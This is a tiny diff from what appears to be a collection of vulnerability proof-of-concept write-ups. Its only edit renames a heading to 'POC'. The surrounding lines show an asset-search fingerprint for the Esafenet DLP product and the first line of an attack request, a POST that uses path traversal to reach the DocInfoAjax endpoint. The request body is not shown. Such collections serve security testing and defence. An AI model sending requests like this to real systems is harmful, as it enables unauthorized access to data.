@@ -8,7 +8,7 @@
 app="亿赛通-DLP"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /CDGServer3/js/../DocInfoAjax HTTP/1.1
